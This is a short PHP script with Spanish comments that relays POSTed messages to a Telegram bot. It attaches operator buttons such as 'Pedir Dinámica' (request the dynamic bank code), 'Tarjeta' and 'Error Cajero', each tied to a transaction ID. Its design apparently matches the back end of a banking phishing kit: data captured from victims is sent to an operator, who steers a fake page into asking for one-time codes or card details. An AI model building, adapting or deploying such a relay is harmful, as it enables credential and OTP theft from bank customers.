<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

$configFile = __DIR__ . '/../../config.php';
if (!file_exists($configFile)) {
    echo json_encode(['status' => 'error', 'message' => 'Config no encontrada']);
    exit;
}

$config = require $configFile;
$botToken = $config['bot_token'] ?? '';
$chatId   = $config['chat_id'] ?? '';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['status' => 'error', 'message' => 'Método no permitido']);
    exit;
}

$message       = trim($_POST['message'] ?? '');
$transactionId = trim($_POST['transactionId'] ?? '');

if (empty($botToken) || empty($chatId)) {
    echo json_encode(['status' => 'error', 'message' => 'Credenciales de bot inválidas']);
    exit;
}

if (empty($message) || empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos faltantes']);
    exit;
}

// Crear teclado inline con botón Tarjeta incluido
$keyboard = [
    'inline_keyboard' => [
        [['text' => "Error Logo",       'callback_data' => "error_logo:$transactionId"]],
        [['text' => "Error Cajero",     'callback_data' => "error_cajero:$transactionId"]],
        [['text' => "Pedir Dinámica",   'callback_data' => "pedir_dinamica:$transactionId"]],
        [['text' => "Tarjeta",          'callback_data' => "tarjeta:$transactionId"]],
        [['text' => "Finalizar",        'callback_data' => "confirm_finalizar:$transactionId"]]
    ]
];

// Preparar payload
$data = [
    'chat_id'      => $chatId,
    'text'         => $message,
    'parse_mode'   => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

// Enviar mensaje
$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlErr  = curl_error($ch);
curl_close($ch);

if ($httpCode === 200) {
    $result = json_decode($response, true);
    if (!empty($result['ok'])) {
        echo json_encode([
            'status'    => 'success',
            'messageId' => $result['result']['message_id']
        ]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Error en respuesta de Telegram']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => "Error HTTP $httpCode: $curlErr"]);
}
?>
